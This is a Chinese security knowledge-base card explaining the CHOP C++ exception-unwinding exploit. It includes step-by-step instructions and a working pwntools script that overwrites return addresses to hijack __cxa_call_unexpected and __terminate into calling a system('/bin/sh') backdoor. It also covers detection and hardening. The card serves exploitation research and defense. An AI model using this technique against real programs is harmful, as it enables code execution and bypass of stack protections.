---
id: binary-pwn-stack-chop-cxa-call-unexpected-golden-gadget
title: CHOP 异常利用：改写返回地址进 __cxa_call_unexpected try 块，借 .eh_frame CFI 从栈恢复 r12 指向后门再由 __terminate 调用
type: scenario
domain: binary
path: binary/pwn/stack
technique: chop-cxa-call-unexpected-eh-frame-register-golden-gadget
tags:
- pwn
- stack
- cpp
- exception
- unwind
- eh_frame
- cfi
- libstdc++
- canary-bypass
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V665
  verified_at: '2026-11-13T08:37:00+08:00'
  notes: 已对照原文与全部17张截图核对：img13 __cxa_call_unexpected try starts at 402DF0、catch(...) owned by 402DF0 经 mov rdi,rax;jmp __cxa_call_unexpected_cold；img14 readelf -wF 行 0x4032a4 为 CFA=rsp+8、rbx=c-56、rbp=c-48、r12=c-40、r13=c-32、r14=c-24、r15=c-16、ra=c-8（已修正卡内原写 r12=c-56 的错误，c-56 实为 rbx；按 c-40 槽位与 img15 的 RBX=cccc/RBP=dddd/R12=eeee 对应一致）；img15 寄存器被栈数据恢复且 R15=0x4032a5=0x4032a4+1；img16 __terminate 中 call rdi 目标 0x6565...；img17 后门 system('/bin/sh') 得 shell（whoami=loorain）；content 最终 exp 各字段与卡内 PoC 逐行一致。boundary：landing-pad 卡只到把返回地址改为 catch landing pad，本卡进一步用 .eh_frame CFI 恢复 r12 并走 __terminate golden gadget，dedup related/new 成立；dup-scan无涉及本卡pair。原文未标版本，未设 affected_versions。内部链接均存在。PoC未复跑。
url: /docs/binary/pwn/stack/binary-pwn-stack-chop-cxa-call-unexpected-golden-gadget/
draft: false
kb_aliases:
- CHOP
- Catch Handler Oriented Programming
- __cxa_call_unexpected
- Golden Gadget
- eh_frame 寄存器恢复
- C++ 异常任意指针调用
- libstdc++ 异常利用
---

## 一句话结论

Linux C++ 异常利用的 CHOP（Catch Handler Oriented Programming）：栈溢出把保存的返回地址改成 `__cxa_call_unexpected()` 的 try 块入口后，unwinder 的 personality 会认为调用方帧在 try 区内并选中 `catch(...)` landing pad；该 landing pad 调 `__cxa_call_unexpected.cold()` → `__terminate(handler)` → `handler()`。handler 由局部变量（旧版 libstdc++）或寄存器 r12（Ubuntu 22.04 等新版）决定，而 r12 可利用 `.eh_frame` FDE 的 CFI 规则「从栈上的 CFA 相对偏移恢复」，因此用栈上可控数据即可把它设为后门地址，最终完成任意指针调用——同时异常路径天然跳过 canary 校验。

## 原理

- **unwind 判定依据返回地址**：`__cxa_throw` 后 `_Unwind_RaiseException` 按 `.eh_frame` 逐帧恢复上下文；对上层帧它用该帧保存的返回地址作为 PC 去查 FDE 与 LSDA。栈溢出可以改写保存的返回地址，从而把 PC 指向攻击者选定的代码区域。
- **入口一：landing pad 选择**：若把返回地址改到某个函数的 try 块内（原文 `__cxa_call_unexpected` 的 try 区起始 `0x402df0`，为规避 left-open 取 `+1`），personality 认为该帧属于 try 区并匹配 `catch(...)`，控制流进入其 landing pad。
- **Golden Gadget**：`__cxa_call_unexpected` 的 catch 块会把 `xh_terminate_handler`（局部变量）交给 `__terminate(handler)`，`__terminate` 再直接 `handler();` 调用——只要控制该局部变量就等于控制一次任意指针调用。原文引用的 CHOP 论文（NDSS'23 "Let Me Unwind That For You"）即以此作为 golden gadget。
- **新版本变化**：Ubuntu 22.04 的 libstdc++ 中调用链变为 `__cxa_call_unexpected` → `__cxa_call_unexpected.cold` → `__terminate`，handler 改为寄存器 `r12`（`mov rdi, r12; call __terminate`），并且要控制局部变量走对分支（`check_exception_spec`），避免中途再次抛出或崩溃。
- **用 .eh_frame 控制 r12**：`.eh_frame` 的 FDE 里记录「CFA = rsp+N」以及 `rbx/rbp/r12/...` 相对 CFA 的保存位置（`readelf -wF` 可见；原文 `0x4032a4` 一行为 `CFA=rsp+8, rbx=c-56, rbp=c-48, r12=c-40, r13=c-32, r14=c-24, r15=c-16, ra=c-8`）。unwinder 在 SEARCH/UNWIND 时按这些规则从栈上恢复寄存器：若把返回地址指向一个 FDE 规则为 `CFA=rsp+8` 且含 `r12=c-XX` 条目的 PC（原文 `0x4032a4+1`），则 r12 会被读成该帧栈上对应偏移的内容——即攻击者的栈数据。
- **为什么能成立**：`-s` 去符号表不会去掉 `.eh_frame`（unwind 依赖它），且异常路径不执行漏洞函数尾声、不触发 canary 检查；unwinder 对「PC 落在哪个函数/是否 try 区」的判断完全信任被覆盖的返回地址，进而把帧的寄存器恢复也变成攻击者可控数据，最终 `__terminate` 调用任意指针。
- **利用流程**：溢出 → `throw` → 返回地址 1 = 某个带 `CA=rsp+8, r12=c-XX` FDE 的 PC（使 r12←栈上值）→ 返回地址 2 = `__cxa_call_unexpected` try 区（landing pad）→ 局部变量按需整形 → `__terminate(r12=后门)`。

## 触发条件

- Linux + GCC/Clang Itanium ABI C++ 异常程序，存在栈溢出且溢出后触发 `throw`。
- 二进制地址可预测（原文静态编译 + 关闭 PIE）或已泄露基址；`.eh_frame` 未被剥离（无法通过 strip 去除）。
- 目标 libstdc++ 版本决定 golden gadget 形态（旧版局部变量 / 新版 r12 + cold 分支），需按版本调试局部变量。
- 攻击者可控制溢出后的栈内容（用于 FDE 恢复的寄存器值与局部变量）。

## 利用步骤

1. 在 IDA/GDB 中定位 `__cxa_call_unexpected` 及其 try 块起始（原文 `0x402df0`，取 `+1` 规避左开区间），确认 catch 块进入 `__terminate` 的调用链（新版经 `__cxa_call_unexpected.cold`，handler 来自 `r12`）。
2. `readelf -wF <binary>` 查看 `.eh_frame` FDE/CFI，选一个 `CFA=rsp+8` 且能恢复 `r12` 的 PC 条目（原文 `0x4032a4` 对应 `r12=c-40`，同行的 c-56/c-48 分别是 rbx/rbp），记录其栈偏移。
3. 构造溢出 payload：填充 → 返回地址1 = 该 FDE 对应 PC+1（unwinder 恢复 r12 为栈上值）→ 返回地址2 = `__cxa_call_unexpected` try 区+1 → 局部变量区域按分支要求填值（防止 crash），并把 r12 对应槽位改为后门函数地址。
4. 触发 `throw`，在 `__terminate`/`call rdi` 处下断调试，按崩溃点逐步调整局部变量（原文「跟着断点看看哪里 crash 然后更改变量为合适的值」）。
5. 最终 `__terminate` 调用后门（原文 `system("/bin/sh")`），获得 shell。

## PoC

原文最终参考 exp（静态编译、关闭 PIE，Ubuntu 22.04 / x86_64）：

```python
from pwn import *
context.arch = 'amd64'; context.os = 'linux'
io = process('./pwn')
backdoor = 0x401a7d
io.recvuntil("called")
payload  = b'a'*8
payload += b'b'*8
payload += b'c'*8
payload += p64(0xff)        # 局部变量，防止 crash
payload += p64(backdoor)    # 供 .eh_frame 规则恢复到 r12 的后门地址
payload += p64(0x4a6001)    # 防止 crash 的局部变量
payload += b'g'*8
payload += p64(0x004032a4+1)  # 返回地址1：FDE 规则把栈上数据装入 r12
payload += p64(0x402df0+1)    # 返回地址2：__cxa_call_unexpected try 块入口
io.send(payload)
io.interactive()
```

```text
# 验证链：__terminate 中 call rdi/r12 处断点显示目标为 backdoor，执行后反弹 shell（原文图 15-17）
```

## 变体与关联

- 与 [[binary-pwn-stack-cpp-exception-unwind-landing-pad-canary-bypass]] 的关系：该卡是 CHOP 的前置步骤（返回地址改为 catch landing pad 跳过 canary），本卡进一步选择 `__cxa_call_unexpected` 作为 landing pad 并借助 `.eh_frame` CFI 控制寄存器，达成任意指针调用（golden gadget）。
- 与 [[binary-pwn-stack-cpp-exception-rbp-overwrite-handler-leave-ret]] 的关系：同一文章的另一条异常处理劫持原语（覆盖 saved RBP 经 handler `leave;ret` 调用 GOT 函数）。
- 与 [[binary-pwn-stack-cpp-unwind-destructor-vtable-hijack-skip-canary]] 的关系：cleanup 阶段析构函数虚表劫持是另一条异常利用路径（原文仅提及）。
- 边界：libstdc++ 版本迭代会改变 golden gadget（旧版局部变量 / 新版 r12 + cold 分支），需按目标版本适配；静态编译/非 PIE 便于固定地址，否则需泄露。

## 检测与防御

- 检测：异常路径崩溃现场显示 `RIP` 指向 `__cxa_call_unexpected`/`__terminate`/`_Unwind_Resume` 且栈上为攻击者填充；`r12`/局部变量被栈数据控制；`.eh_frame` 被用作寄存器恢复跳板（FDE 选点异常）。
- 修复：消除溢出（先校验长度再拷贝）；避免「拷贝后才检查并 throw」的错误模式。
- 加固：启用向后边沿控制流保护（Intel CET shadow stack / LLVM CFI）可让伪造返回地址在 `ret`/unwind 时失效；PIE+ASLR 增加地址预测难度；保持 libstdc++ 更新（golden gadget 形态变化但不等于修复）；对异常频繁的程序做编译选项审查（`-fno-exceptions` 不可行时加强代码审计）。
